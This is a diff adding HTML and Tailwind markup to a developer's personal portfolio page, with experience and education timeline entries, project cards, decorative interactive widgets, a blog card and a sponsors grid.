+                    <div
+                        class="absolute -left-[41px] top-6 w-4 h-4 rounded-full border-2 border-zinc-50 dark:border-[#08080a] bg-violet-500 dark:bg-violet-400 group-hover:bg-zinc-900 dark:group-hover:bg-zinc-100 transition-colors">
+                    </div>
+                    <div class="flex flex-col sm:flex-row sm:items-baseline justify-between mb-2">
+                        <h3
+                            class="font-display font-semibold text-lg text-zinc-900 dark:text-zinc-100 flex items-center gap-3">
+                            <span
+                                class="w-8 h-8 rounded-full bg-zinc-100 dark:bg-zinc-800 flex items-center justify-center border border-zinc-200 dark:border-zinc-700 shrink-0">
+                                <i data-feather="globe" class="w-4 h-4 text-zinc-500"></i>
+                            </span>
+                            <span>Full-stack Developer <span class="text-xs text-zinc-400 font-normal">at
+                                    Freelance</span></span>
+                            <span
+                                class="px-2 py-0.5 bg-violet-100 text-violet-750 dark:bg-violet-950/60 dark:text-violet-300 text-[10px] font-bold rounded-full border border-violet-200 dark:border-violet-800">Current
+                                Employer</span>
+                        </h3>
+                        <span class="text-sm text-zinc-500 dark:text-zinc-400 font-mono mt-1 sm:mt-0">2025 —
+                            Present</span>
+                    </div>
+                    <div class="text-zinc-650 dark:text-zinc-400 mb-3 font-medium text-sm">Part-time</div>
+                    <p class="text-zinc-600 dark:text-zinc-400 text-sm leading-relaxed mb-4">
+                        Designing and building full-stack web solutions for global clients. Deploying and maintaining
+                        server architecture.
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Laravel</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">React</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Express.js</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Socket.IO</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">MongoDB</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Firebase</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">WordPress</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Docker</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">NGINX</span>
+                    </div>
+                </div>
+
+                <!-- Expanded Experience (inside timeline for continuous line) -->
+                <div id="experience-expanded" class="experience-expand-wrap">
+                    <div class="experience-expand-inner space-y-6">
+
+                    <!-- Entry 3: Freelance — Graphic & UI/UX Designer -->
+                    <div class="relative group glass-card rounded-xl p-5">
+                        <div
+                            class="absolute -left-[41px] top-6 w-4 h-4 rounded-full border-2 border-zinc-50 dark:border-[#08080a] bg-zinc-300 dark:bg-zinc-700 group-hover:bg-zinc-900 dark:group-hover:bg-zinc-100 transition-colors">
+                        </div>
+                        <div class="flex flex-col sm:flex-row sm:items-baseline justify-between mb-2">
+                            <h3
+                                class="font-display font-semibold text-lg text-zinc-900 dark:text-zinc-100 flex items-center gap-3">
+                                <span
+                                    class="w-8 h-8 rounded-full bg-zinc-100 dark:bg-zinc-800 flex items-center justify-center border border-zinc-200 dark:border-zinc-700 shrink-0">
+                                    <i data-feather="image" class="w-4 h-4 text-zinc-500"></i>
+                                </span>
+                                <span>Graphic & UI/UX Designer <span class="text-xs text-zinc-400 font-normal">at
+                                        Freelance</span></span>
+                            </h3>
+                            <span class="text-sm text-zinc-500 dark:text-zinc-400 font-mono mt-1 sm:mt-0">2021 —
+                                2026</span>
+                        </div>
+                        <div class="text-zinc-650 dark:text-zinc-400 mb-3 font-medium text-sm">Part-time &bull; 5 yrs
+                        </div>
+                        <p class="text-zinc-600 dark:text-zinc-400 text-sm leading-relaxed mb-4">
+                            Designed high-fidelity mockups, layouts, and brand visual assets. Kept designs clean and
+                            focused on user experience.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Creativity</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">UI/UX
+                                Design</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Graphic
+                                Design</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Sketch</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Adobe
+                                Photoshop</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Adobe
+                                Illustrator</span>
+                        </div>
+                    </div>
+
+                    <!-- Entry 5: Metropolitan University -->
+                    <div class="relative group glass-card rounded-xl p-5">
+                        <div
+                            class="absolute -left-[41px] top-6 w-4 h-4 rounded-full border-2 border-zinc-50 dark:border-[#08080a] bg-zinc-300 dark:bg-zinc-700 group-hover:bg-zinc-900 dark:group-hover:bg-zinc-100 transition-colors">
+                        </div>
+                        <div class="flex flex-col sm:flex-row sm:items-baseline justify-between mb-2">
+                            <h3
+                                class="font-display font-semibold text-lg text-zinc-900 dark:text-zinc-100 flex items-center gap-3">
+                                <span
+                                    class="w-8 h-8 rounded-full bg-zinc-100 dark:bg-zinc-800 flex items-center justify-center border border-zinc-200 dark:border-zinc-700 shrink-0">
+                                    <i data-feather="book-open" class="w-4 h-4 text-zinc-500"></i>
+                                </span>
+                                <span>Metropolitan University <span class="text-xs text-zinc-400 font-normal">-- CSE
+                                        Study</span></span>
+                            </h3>
+                            <span class="text-sm text-zinc-500 dark:text-zinc-400 font-mono mt-1 sm:mt-0">04.2025 —
+                                Present</span>
+                        </div>
+                        <div class="text-zinc-650 dark:text-zinc-400 mb-3 font-medium text-sm">Bachelor of Science in
+                            Computer Science & Engineering (CSE)</div>
+                        <p class="text-zinc-600 dark:text-zinc-400 text-sm leading-relaxed mb-4">
+                            Focused studies in algorithms, advanced data structures, systems and database engineering,
+                            and software development methodologies.
+                        </p>
+                        <div class="flex flex-wrap gap-2">
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">C++</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Java</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Python</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">PHP</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">DSA</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Advanced
+                                Databases</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Systems
+                                Design</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Distributed
+                                Systems</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Software
+                                Engineering</span>
+                            <span
+                                class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Teamwork</span>
+                        </div>
+                    </div>
+
+                    <!-- Entry 6: Sylhet Government College -->
+                    <div class="relative group glass-card rounded-xl p-5">
+                        <div
+                            class="absolute -left-[41px] top-6 w-4 h-4 rounded-full border-2 border-zinc-50 dark:border-[#08080a] bg-zinc-300 dark:bg-zinc-700 group-hover:bg-zinc-900 dark:group-hover:bg-zinc-100 transition-colors">
+                        </div>
+                        <div class="flex flex-col sm:flex-row sm:items-baseline justify-between mb-2">
+                            <h3
+                                class="font-display font-semibold text-lg text-zinc-900 dark:text-zinc-100 flex items-center gap-3">
+                                <span
+                                    class="w-8 h-8 rounded-full bg-zinc-100 dark:bg-zinc-800 flex items-center justify-center border border-zinc-200 dark:border-zinc-700 shrink-0">
+                                    <i data-feather="award" class="w-4 h-4 text-zinc-500"></i>
+                                </span>
+                                <span>Sylhet Government College <span class="text-xs text-zinc-400 font-normal">--
+                                        Science Studies</span></span>
+                            </h3>
+                            <span class="text-sm text-zinc-500 dark:text-zinc-400 font-mono mt-1 sm:mt-0">03.2022 —
+                                08.2024</span>
+                        </div>
+                        <div class="text-zinc-650 dark:text-zinc-400 mb-3 font-medium text-sm">Science Focus</div>
+                        <p class="text-zinc-600 dark:text-zinc-400 text-sm leading-relaxed mb-4">
+                            Completed higher secondary school certifications in standard science curricula (Physics,
+                            Chemistry, and Mathematics).
+                        </p>
+                    </div>
+
+                    </div>
+                </div>
+
+            </div>
+
+                <!-- Show More -->
+                <div class="flex justify-center py-1">
+                    <button id="exp-toggle-btn"
+                        class="flex items-center space-x-2 text-sm font-semibold text-zinc-500 hover:text-zinc-950 dark:hover:text-white transition-colors"
+                        aria-label="Toggle experience list view" aria-expanded="false">
+                        <span id="exp-toggle-text">Show More</span>
+                        <i id="exp-toggle-icon" data-lucide="chevron-down"
+                            class="w-4 h-4 transition-transform duration-300"></i>
+                    </button>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Selected Projects (2×2 visible + Show More row, 2 hidden) -->
+        <section id="projects" class="space-y-8 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Selected Projects</h2>
+            <div class="space-y-6">
+
+                <!-- Rows 1–2: 4 visible cards -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+
+                <!-- Card 1 -->
+                <div
+                    class="glass-card group p-5 rounded-2xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-all hover:shadow-lg shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex justify-between items-start mb-4">
+                            <div
+                                class="w-10 h-10 rounded-lg bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
+                                <i data-feather="activity" class="w-5 h-5 text-blue-600 dark:text-blue-400"></i>
+                            </div>
+                            <span class="text-xs font-mono text-zinc-400">2023</span>
+                        </div>
+                        <h3 class="font-display font-semibold text-lg mb-2">Analytics Dashboard</h3>
+                        <p class="text-sm text-zinc-600 dark:text-zinc-400 mb-4 leading-relaxed">A real-time analytics
+                            dashboard tracking user metrics and system health with customizable widgets.</p>
+                        <ul class="text-xs text-zinc-500 space-y-1 pl-4 list-disc mb-4">
+                            <li>Optimized rendering cycles under load</li>
+                            <li>Integrated WebSocket pipeline</li>
+                        </ul>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="text-xs font-mono text-zinc-400">Next.js</span>
+                        <span class="text-xs font-mono text-zinc-400">Recharts</span>
+                        <span class="text-xs font-mono text-zinc-400">Tailwind CSS</span>
+                    </div>
+                </div>
+
+                <!-- Card 2 -->
+                <div
+                    class="glass-card group p-5 rounded-2xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-all hover:shadow-lg shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex justify-between items-start mb-4">
+                            <div
+                                class="w-10 h-10 rounded-lg bg-emerald-100 dark:bg-emerald-900/30 flex items-center justify-center">
+                                <i data-feather="layers" class="w-5 h-5 text-emerald-600 dark:text-emerald-400"></i>
+                            </div>
+                            <span class="text-xs font-mono text-zinc-400">2023</span>
+                        </div>
+                        <h3 class="font-display font-semibold text-lg mb-2">Design System UI</h3>
+                        <p class="text-sm text-zinc-600 dark:text-zinc-400 mb-4 leading-relaxed">An open-source
+                            component library built with accessibility in mind. Over 2k stars on GitHub.</p>
+                        <ul class="text-xs text-zinc-500 space-y-1 pl-4 list-disc mb-4">
+                            <li>Meets WCAG AA accessibility rules</li>
+                            <li>Lightweight zero-dependency bundle</li>
+                        </ul>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="text-xs font-mono text-zinc-400">React</span>
+                        <span class="text-xs font-mono text-zinc-400">Storybook</span>
+                        <span class="text-xs font-mono text-zinc-400">Base UI</span>
+                    </div>
+                </div>
+
+                <!-- Card 3 -->
+                <div
+                    class="glass-card group p-5 rounded-2xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-all hover:shadow-lg shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex justify-between items-start mb-4">
+                            <div
+                                class="w-10 h-10 rounded-lg bg-indigo-100 dark:bg-indigo-900/30 flex items-center justify-center">
+                                <i data-feather="server" class="w-5 h-5 text-indigo-650 dark:text-indigo-400"></i>
+                            </div>
+                            <span class="text-xs font-mono text-zinc-400">2024</span>
+                        </div>
+                        <h3 class="font-display font-semibold text-lg mb-2">Cloud Dev Environment</h3>
+                        <p class="text-sm text-zinc-600 dark:text-zinc-400 mb-4 leading-relaxed">Orchestrated remote
+                            container workspaces for developer teams to sync environments instantly.</p>
+                        <ul class="text-xs text-zinc-500 space-y-1 pl-4 list-disc mb-4">
+                            <li>Decreased project setup times by 80%</li>
+                            <li>Zero-trust proxy integration</li>
+                        </ul>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="text-xs font-mono text-zinc-400">Go</span>
+                        <span class="text-xs font-mono text-zinc-400">Docker</span>
+                        <span class="text-xs font-mono text-zinc-400">Kubernetes</span>
+                    </div>
+                </div>
+
+                <!-- Card 4 -->
+                <div
+                    class="glass-card group p-5 rounded-2xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-all hover:shadow-lg shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex justify-between items-start mb-4">
+                            <div
+                                class="w-10 h-10 rounded-lg bg-pink-100 dark:bg-pink-900/30 flex items-center justify-center">
+                                <i data-feather="message-square"
+                                    class="w-5 h-5 text-pink-600 dark:text-pink-400"></i>
+                            </div>
+                            <span class="text-xs font-mono text-zinc-400">2024</span>
+                        </div>
+                        <h3 class="font-display font-semibold text-lg mb-2">Collaborative Workspace</h3>
+                        <p class="text-sm text-zinc-600 dark:text-zinc-400 mb-4 leading-relaxed">Real-time
+                            collaborative doc editing and virtual whiteboard with low latency.</p>
+                        <ul class="text-xs text-zinc-500 space-y-1 pl-4 list-disc mb-4">
+                            <li>Optimized conflict-free replicated data (CRDTs)</li>
+                            <li>Built-in voice channel</li>
+                        </ul>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="text-xs font-mono text-zinc-400">React</span>
+                        <span class="text-xs font-mono text-zinc-400">Socket.IO</span>
+                        <span class="text-xs font-mono text-zinc-400">WebRTC</span>
+                    </div>
+                </div>
+
+                </div>
+
+                <!-- Row 3: Show More -->
+                <div class="flex justify-center items-center py-1">
+                    <button id="proj-toggle-btn"
+                        class="flex items-center space-x-2 text-sm font-semibold text-zinc-500 hover:text-zinc-950 dark:hover:text-white transition-colors"
+                        aria-label="Toggle projects list view" aria-expanded="false">
+                        <span id="proj-toggle-text">Show More</span>
+                        <i id="proj-toggle-icon" data-lucide="chevron-down"
+                            class="w-4 h-4 transition-transform duration-300"></i>
+                    </button>
+                </div>
+
+                <!-- Expanded row: 2 more cards -->
+                <div id="projects-expanded" class="projects-expand-wrap">
+                    <div class="projects-expand-inner">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+
+                    <!-- Card 5 -->
+                    <div
+                        class="glass-card group p-5 rounded-2xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-all hover:shadow-lg shadow-sm flex flex-col justify-between">
+                        <div>
+                            <div class="flex justify-between items-start mb-4">
+                                <div
+                                    class="w-10 h-10 rounded-lg bg-orange-100 dark:bg-orange-900/30 flex items-center justify-center">
+                                    <i data-feather="cpu" class="w-5 h-5 text-orange-600 dark:text-orange-400"></i>
+                                </div>
+                                <span class="text-xs font-mono text-zinc-400">2025</span>
+                            </div>
+                            <h3 class="font-display font-semibold text-lg mb-2">AI Core Search Engine</h3>
+                            <p class="text-sm text-zinc-600 dark:text-zinc-400 mb-4 leading-relaxed">Semantic vector
+                                search engine utilizing LLM parsing for smart document Q&A.</p>
+                            <ul class="text-xs text-zinc-500 space-y-1 pl-4 list-disc mb-4">
+                                <li>Supports multi-modal file ingestion</li>
+                                <li>Real-time query streaming</li>
+                            </ul>
+                        </div>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="text-xs font-mono text-zinc-400">Python</span>
+                            <span class="text-xs font-mono text-zinc-400">LangChain</span>
+                            <span class="text-xs font-mono text-zinc-400">VectorDB</span>
+                        </div>
+                    </div>
+
+                    <!-- Card 6 -->
+                    <div
+                        class="glass-card group p-5 rounded-2xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-all hover:shadow-lg shadow-sm flex flex-col justify-between">
+                        <div>
+                            <div class="flex justify-between items-start mb-4">
+                                <div
+                                    class="w-10 h-10 rounded-lg bg-purple-100 dark:bg-purple-900/30 flex items-center justify-center">
+                                    <i data-feather="database" class="w-5 h-5 text-purple-650 dark:text-purple-400"></i>
+                                </div>
+                                <span class="text-xs font-mono text-zinc-400">2025</span>
+                            </div>
+                            <h3 class="font-display font-semibold text-lg mb-2">Edge KV Database</h3>
+                            <p class="text-sm text-zinc-600 dark:text-zinc-400 mb-4 leading-relaxed">Globally
+                                distributed key-value store running at the edge with zero cold starts.</p>
+                            <ul class="text-xs text-zinc-500 space-y-1 pl-4 list-disc mb-4">
+                                <li>High concurrency lockless design</li>
+                                <li>Optimized WASM deployment size</li>
+                            </ul>
+                        </div>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="text-xs font-mono text-zinc-400">Rust</span>
+                            <span class="text-xs font-mono text-zinc-400">WASM</span>
+                            <span class="text-xs font-mono text-zinc-400">Cloudflare Workers</span>
+                        </div>
+                    </div>
+
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Interactive Component Showcase -->
+        <section id="showcase" class="space-y-8 fade-in-up">
+            <div class="space-y-2">
+                <h2 class="font-display text-2xl font-bold tracking-tight">Interactive Showcase</h2>
+                <p class="text-sm text-zinc-500">Decorative interactive widgets highlighting client-side capabilities.
+                </p>
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+                <!-- Copy to Clipboard -->
+                <div class="glass-card showcase-widget p-5 rounded-2xl flex flex-col justify-between min-h-[148px]">
+                    <div>
+                        <h3 class="text-sm font-semibold mb-1">Copy to Clipboard</h3>
+                        <p class="text-xs text-zinc-500 mb-4">One-click copy with feedback.</p>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <code id="showcase-copy-text"
+                            class="flex-1 text-xs font-mono px-3 py-2 rounded-lg bg-zinc-100/80 dark:bg-zinc-800/60 border border-zinc-200/80 dark:border-zinc-700/80 truncate">rakib@example.com</code>
+                        <button id="showcase-copy-btn" type="button"
+                            class="shrink-0 px-3 py-2 text-xs font-semibold rounded-lg bg-zinc-950 dark:bg-white text-white dark:text-zinc-950 hover:opacity-90 transition-opacity">
+                            Copy
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Animated Theme Toggle -->
+                <div class="glass-card showcase-widget p-5 rounded-2xl flex flex-col justify-between min-h-[148px]">
+                    <div>
+                        <h3 class="text-sm font-semibold mb-1">Theme Toggle</h3>
+                        <p class="text-xs text-zinc-500 mb-4">Animated switch preview.</p>
+                    </div>
+                    <div class="flex items-center justify-between">
+                        <div id="showcase-theme-preview"
+                            class="w-16 h-10 rounded-lg border border-zinc-200 dark:border-zinc-700 bg-gradient-to-br from-amber-100 to-sky-100 dark:from-zinc-800 dark:to-zinc-900 transition-all duration-500"></div>
+                        <button id="showcase-theme-toggle" type="button" aria-label="Toggle demo theme"
+                            class="relative w-12 h-7 rounded-full bg-zinc-200 dark:bg-zinc-700 transition-colors duration-300">
+                            <span id="showcase-theme-knob"
+                                class="absolute top-0.5 left-0.5 w-6 h-6 rounded-full bg-white dark:bg-zinc-950 shadow-md transition-transform duration-300 flex items-center justify-center">
+                                <i data-feather="sun" class="w-3 h-3 text-amber-500 dark:hidden"></i>
+                                <i data-feather="moon" class="w-3 h-3 text-violet-400 hidden dark:block"></i>
+                            </span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Slide to Unlock -->
+                <div class="glass-card showcase-widget p-5 rounded-2xl flex flex-col justify-between min-h-[148px]">
+                    <div>
+                        <h3 class="text-sm font-semibold mb-1">Slide to Unlock</h3>
+                        <p class="text-xs text-zinc-500 mb-4">Drag the knob to unlock.</p>
+                    </div>
+                    <div id="slide-track"
+                        class="relative w-full h-11 bg-zinc-100/80 dark:bg-zinc-800/60 rounded-full border border-zinc-200/80 dark:border-zinc-700/80 p-1 flex items-center overflow-hidden">
+                        <div id="slide-btn"
+                            class="w-9 h-9 rounded-full bg-zinc-950 dark:bg-white flex items-center justify-center text-white dark:text-zinc-950 cursor-grab active:cursor-grabbing shadow-md z-10 select-none">
+                            <i data-feather="chevron-right" class="w-4 h-4"></i>
+                        </div>
+                        <span id="slide-text"
+                            class="absolute w-full text-center text-xs font-semibold select-none text-zinc-400 dark:text-zinc-500 pointer-events-none">Slide to Unlock</span>
+                    </div>
+                </div>
+
+                <!-- Live Clock -->
+                <div class="glass-card showcase-widget p-5 rounded-2xl flex flex-col justify-between min-h-[148px]">
+                    <div>
+                        <h3 class="text-sm font-semibold mb-1">Live Clock</h3>
+                        <p class="text-xs text-zinc-500 mb-4">Real-time local display.</p>
+                    </div>
+                    <div class="text-center">
+                        <div id="showcase-live-clock"
+                            class="text-2xl font-mono font-bold tracking-wider text-zinc-900 dark:text-zinc-100">00:00:00</div>
+                        <div id="showcase-live-date" class="text-xs text-zinc-500 mt-1 font-mono">Loading…</div>
+                    </div>
+                </div>
+
+                <!-- Hover Tilt Card -->
+                <div class="glass-card showcase-widget p-5 rounded-2xl flex flex-col justify-between min-h-[148px]">
+                    <div>
+                        <h3 class="text-sm font-semibold mb-1">Hover Tilt</h3>
+                        <p class="text-xs text-zinc-500 mb-4">Move cursor over the card.</p>
+                    </div>
+                    <div id="tilt-card" class="tilt-card mx-auto w-full max-w-[200px] h-20 rounded-xl bg-gradient-to-br from-violet-500/20 to-fuchsia-500/20 border border-violet-300/30 dark:border-violet-700/40 flex items-center justify-center transition-transform duration-200 ease-out"
+                        style="transform-style: preserve-3d;">
+                        <span class="text-xs font-semibold text-violet-600 dark:text-violet-300">3D Tilt Effect</span>
+                    </div>
+                </div>
+
+                <!-- Progress Slider -->
+                <div class="glass-card showcase-widget p-5 rounded-2xl flex flex-col justify-between min-h-[148px]">
+                    <div>
+                        <h3 class="text-sm font-semibold mb-1">Progress Slider</h3>
+                        <p class="text-xs text-zinc-500 mb-4">Drag to adjust completion.</p>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="h-2 rounded-full bg-zinc-200/80 dark:bg-zinc-700/60 overflow-hidden">
+                            <div id="showcase-progress-bar"
+                                class="h-full rounded-full bg-gradient-to-r from-violet-500 to-fuchsia-500 transition-all duration-150"
+                                style="width: 45%"></div>
+                        </div>
+                        <input id="showcase-progress-slider" type="range" min="0" max="100" value="45"
+                            class="w-full accent-violet-500 cursor-pointer" aria-label="Progress slider">
+                        <div class="text-xs font-mono text-zinc-500 text-right"><span id="showcase-progress-value">45</span>%</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Blog Section with cover image and hover zoom -->
+        <section id="blog" class="space-y-8 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Recent Writing</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <!-- Article Card 1 -->
+                <a href="#" class="group block space-y-4">
+                    <div
+                        class="glass-card aspect-video w-full overflow-hidden rounded-xl relative">
+                        <div
+                            class="absolute inset-0 bg-gradient-to-tr from-indigo-500/20 to-purple-500/20 group-hover:scale-105 transition-transform duration-500 flex items-center justify-center">
+                            <i data-feather="book-open" class="w-10 h-10 text-indigo-500/40"></i>
+                        </div>
+                        <span
+                            class="absolute top-3 right-3 bg-violet-650 text-white text-[9px] font-bold tracking-wider uppercase px-2 py-0.5 rounded-full shadow-sm">New</span>
+                    </div>
+                    <div>
+                        <div class="text-xs font-mono text-zinc-400 mb-2">October 12, 2023 &bull; 5 min read</div>
+                        <h3
+                            class="font-display font-semibold text-xl group-hover:text-violet-500 transition-colors mb-2">
+                            Mastering Tailwind CSS</h3>
+                        <p class="text-sm text-zinc-500 dark:text-zinc-400 line-clamp-2 leading-relaxed">Deep dive into
+                            creating scalable layouts using utility-first styling patterns and config overrides.</p>
+                    </div>
+                </a>
+            </div>
+        </section>
+
+        <!-- Sponsors Section (chanhdai-style bordered grid) -->
+        <section id="sponsors" class="space-y-10 fade-in-up">
+            <div class="space-y-3">
+                <p class="text-sm text-zinc-500">Sponsors</p>
+                <h2 class="font-display text-3xl md:text-4xl font-bold tracking-tight text-zinc-950 dark:text-zinc-50">
+                    Backed by the community.</h2>
+                <p class="text-base text-zinc-500 max-w-xl leading-relaxed">Grateful to the sponsors who make this
+                    open-source work possible.</p>
+            </div>
+
+            <div class="space-y-10">
+                <!-- Open Source Program -->
+                <div class="sponsor-row reveal">
+                    <h3 class="sponsor-tier-label">Open Source Program</h3>
+                    <div class="sponsor-grid glass-card">
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/vercel" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">Vercel</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/1password" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">1Password</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://www.openpanel.dev/favicon.ico" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">OpenPanel</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/mintlify" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">mintlify</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/posthog" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">PostHog</span>
+                        </div>
+                        <div class="sponsor-cell sponsor-cell-empty" aria-hidden="true"></div>
+                    </div>
+                </div>
+
+                <!-- Gold Sponsors -->
+                <div class="sponsor-row reveal">
+                    <h3 class="sponsor-tier-label">Gold Sponsors</h3>
+                    <div class="sponsor-grid glass-card">
+                        <div class="sponsor-cell">
+                            <img src="https://shadcnstudio.com/favicon.ico" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <div class="min-w-0">
+                                <span class="sponsor-name block">shadcnstudio.com</span>
+                                <span class="sponsor-sub">shadcn blocks &amp; templates</span>
+                            </div>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://shadcnspace.com/favicon.ico" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">shadcnspace</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/raycast" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">Raycast</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/supabase" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">Supabase</span>
